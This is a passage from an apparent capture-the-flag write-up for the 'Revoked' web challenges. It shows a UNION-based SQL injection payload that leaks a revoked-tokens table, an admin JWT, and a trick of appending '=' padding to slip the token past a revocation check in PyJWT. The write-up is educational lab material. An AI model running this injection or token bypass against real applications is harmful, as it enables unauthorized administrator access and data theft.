</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">            request</span><span class="token punctuation">.</span><span class="">username </span><span class="token operator">=</span><span class=""> username
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">        </span><span class="token keyword">except</span><span class=""> jwt</span><span class="token punctuation">.</span><span class="">InvalidTokenError</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">            flash</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid token!&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">            </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">        </span><span class="token keyword">return</span><span class=""> f</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="">args</span><span class="token punctuation">,</span><span class=""> </span><span class="token operator">**</span><span class="">kwargs</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">    </span><span class="token keyword">return</span><span class=""> decorated</span></code></pre></div></div>
<p>So the main idea is this: we can leak the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">revoked_tokens</code> table and (assumedly) find an admin token there. If we can slightly perturb this token such that it is no longer exactly the same token as before (but the token still decodes correctly), we can become admin and win!</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/admin&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token decorator annotation punctuation">@token_required</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">    is_admin </span><span class="token operator">=</span><span class=""> </span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="">request</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;is_admin&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token keyword">if</span><span class=""> is_admin</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token keyword">return</span><span class=""> render_template</span><span class="token punctuation">(</span><span class="token string">&quot;admin.html&quot;</span><span class="token punctuation">,</span><span class=""> username</span><span class="token operator">=</span><span class="">request</span><span class="token punctuation">.</span><span class="">username</span><span class="token punctuation">,</span><span class=""> flag</span><span class="token operator">=</span><span class="">FLAG</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">7</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">    flash</span><span class="token punctuation">(</span><span class="token string">&quot;You don&#x27;t have the permission to access this area&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">    </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/employees&quot;</span><span class="token punctuation">)</span></code></pre></div></div>
<p>We can use our simple SQL injection to leak the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">revoked_tokens</code> table,</p>
<p><img src="https://gist.github.com/user-attachments/assets/855a8a52-0b13-4e63-8bf5-7a538bbc906b" alt="image"/></p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<!-- --> (sql)<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">a</span><span class="token operator">%</span><span class="">&#x27;</span><span class="token keyword">UNION</span><span class=""> </span><span class="token keyword">SELECT</span><span class=""> id</span><span class="token punctuation">,</span><span class="">token</span><span class="token punctuation">,</span><span class="">token</span><span class="token punctuation">,</span><span class="">token </span><span class="token keyword">FROM</span><span class=""> revoked_tokens</span><span class="token punctuation">;</span><span class="token comment">--</span></code></pre></div></div>
<p>and just check tokens until we find one corresponding to an admin (in this case,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY0NjgzOC4zODE5NzgzfQ.5xEmNRYdgbWg77FWf3kPs28Ulcsqm_JimpCYymoCCCk</span></code></pre></div></div>
<p><img src="https://gist.github.com/user-attachments/assets/b48b21e0-d52b-49da-b0e2-ac3588c59d54" alt="image"/></p>
<p>So how do we change this slightly to bypass the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">revoked_tokens</code> check? What if we simply add an <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">=</code> to the end of it? (after all, <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">=</code> is a padding character in base64 each part of the JWT is base64 encoded, right?)</p>
<p>Setting our JWT cookie to</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY0NjgzOC4zODE5NzgzfQ.5xEmNRYdgbWg77FWf3kPs28Ulcsqm_JimpCYymoCCCk=</span></code></pre></div></div>
<p>we get the flag:</p>
<p><img src="https://gist.github.com/user-attachments/assets/3e7424f6-d396-4778-9e7f-14b2a8c47c44" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/d324b702-18b2-4f03-bfb6-e4fdc68b44fd" alt="image"/></p>
<p>(this same solve works on both <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">Revoked</code> and <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">Revoked Revenge</code>, as we didn&#x27;t rely on any shenanigans with any &quot;debug accounts&quot;).</p>
<div class="relative"><span id="but-wait-a-second..." class="absolute -top-16"></span><a class="group flex gap-2 items-center text-inherit hover:underline decoration-1 underline-offset-4 decoration-secondary decoration-dotted text-3xl font-bold mt-10 mb-4 " href="#but-wait-a-second..."><h2>But wait a second...</h2><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="hidden group-hover:block text-xl absolute pt-0.5 -left-7 stroke-[1.5px] text-secondary" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></div>
<p>Why does this payload actually work? Indeed, if we tried to add an <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">=</code> to the JWT on <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">jwt.io</code>, we&#x27;d get the following error message:</p>
<p><img src="https://gist.github.com/user-attachments/assets/6c273e82-c48c-495c-98f8-5882a2063fdb" alt="image"/></p>
<p>The caveat is this: JWT segments aren&#x27;t base64 encoded, they are <em>base64url</em> encoded. And seemingly from reading the <a href="https://developer.mozilla.org/en-US/docs/Glossary/Base64#url_and_filename_safe_base64">MDN documentation</a>,</p>
<blockquote>
<p>A common variant of this definition allows only characters that are safe to use in filenames and URL values. This version, defined in RFC 4648, section 5, omits the padding and replaces <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">+</code> and <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">/</code> with <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">-</code> and <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">_</code>.</p>
</blockquote>
<p>So if <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">base64url</code> omits the padding <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">=</code> characters, why did Python&#x27;s <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">jwt</code> decode it anyways? I decided to read the <a href="https://github.com/jpadilla/pyjwt/tree/master">PyJWT source</a> to find out:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">    </span><span class="token keyword">def</span><span class=""> </span><span class="token function">decode</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">        self</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">        jwt</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        key</span><span class="token punctuation">:</span><span class=""> AllowedPublicKeys </span><span class="token operator">|</span><span class=""> PyJWK </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">bytes</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">        algorithms</span><span class="token punctuation">:</span><span class=""> Sequence</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        options</span><span class="token punctuation">:</span><span class=""> Options </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token comment"># deprecated arg, remove in pyjwt3</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">        verify</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">bool</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token comment"># could be used as passthrough to api_jws, consider removal in pyjwt3</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        detached_payload</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">bytes</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">        </span><span class="token comment"># passthrough arguments to _validate_claims</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">        </span><span class="token comment"># consider putting in options</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">        audience</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> Iterable</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">        subject</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">        issuer</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> Container</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">        leeway</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">float</span><span class=""> </span><span class="token operator">|</span><span class=""> timedelta </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">        </span><span class="token comment"># kwargs</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">        </span><span class="token operator">**</span><span class="">kwargs</span><span class="token punctuation">:</span><span class=""> Any</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">    </span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class=""> </span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class=""> Any</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">        </span><span class="token triple-quoted-string string">&quot;&quot;&quot;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span>        ...
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="token triple-quoted-string string">        &quot;&quot;&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">        </span><span class="token keyword">if</span><span class=""> kwargs</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">            warnings</span><span class="token punctuation">.</span><span class="">warn</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">                </span><span class="token string">&quot;passing additional kwargs to decode() is deprecated &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">                </span><span class="token string">&quot;and will be removed in pyjwt version 3. &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">                </span><span class="token string-interpolation string">f&quot;Unsupported kwargs: </span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation builtin">tuple</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation">kwargs</span><span class="token string-interpolation interpolation punctuation">.</span><span class="token string-interpolation interpolation">keys</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">                RemovedInPyjwt3Warning</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">                stacklevel</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">            </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">        decoded </span><span class="token operator">=</span><span class=""> self</span><span class="token punctuation">.</span><span class="">decode_complete</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">            jwt</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">            key</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">            algorithms</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">            options</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">            verify</span><span class="token operator">=</span><span class="">verify</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">            detached_payload</span><span class="token operator">=</span><span class="">detached_payload</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">            audience</span><span class="token operator">=</span><span class="">audience</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">            subject</span><span class="token operator">=</span><span class="">subject</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">            issuer</span><span class="token operator">=</span><span class="">issuer</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">            leeway</span><span class="token operator">=</span><span class="">leeway</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">        </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">        </span><span class="token keyword">return</span><span class=""> decoded</span><span class="token punctuation">[</span><span class="token string">&quot;payload&quot;</span><span class="token punctuation">]</span></code></pre></div></div>
